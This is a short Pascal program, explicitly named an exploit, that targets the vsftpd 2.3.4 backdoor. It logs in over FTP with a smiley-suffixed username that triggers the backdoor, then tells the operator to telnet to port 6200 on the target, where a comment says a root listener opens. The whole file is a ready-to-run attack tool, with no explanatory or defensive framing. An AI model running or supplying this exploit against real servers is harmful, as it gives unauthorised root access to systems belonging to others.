program exploit;

{
  https://packetstormsecurity.com/files/162145/vsftpd-2.3.4-Backdoor-Command-Execution.html
  Using : in the username triggers the backdoor which opens a listener on port 6200 running as root

  Depends on Synapse - Install through OPM
}

uses
  ftpsend;

var
  Sock: TFTPSend;
begin
  if paramCount <> 1 then writeln('Usage ./exploit <target ip>') else begin

    Sock := TFTPSend.Create;
    try
      Sock.UserName := 'nergal:)';
      Sock.Password := 'pass';
      Sock.TargetPort := '21';
      Sock.TargetHost := ParamStr(1);
      Sock.Timeout := 1000;
      Writeln('Logging in with vulnerable credentials');
      Sock.Login;
      Sock.Logout;
      Writeln('Try connecting to target with telnet ' + Sock.TargetHost + ' 6200');
    finally
      Sock.Free;
    end;
  end;
end.
